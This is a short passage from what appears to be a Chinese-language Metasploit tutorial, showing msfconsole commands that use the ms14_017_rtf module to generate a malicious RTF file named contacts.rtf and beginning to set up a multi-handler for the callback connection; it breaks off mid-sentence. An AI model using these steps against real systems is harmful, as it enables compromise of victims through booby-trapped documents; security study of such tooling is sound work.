    `msf exploit(ms14_017_rtf) >`\n\n### 第 7 步：编译漏洞\n\n使用 *exploit* 命令编译漏洞。\n\n`msf\
    \ exploit(ms14_017_rtf) > exploit`\n`[+] contacts.rtf stored at /root/.msf4/local/contacts.rtf`\n\
    `msf exploit(ms14_017_rtf) >`\n\n### 第 8 步：配置漏洞的多路处理器连接\n\n我们现在已成功创建了漏洞。下一步是配置它接受到我们计算机的连接。我们将使用\
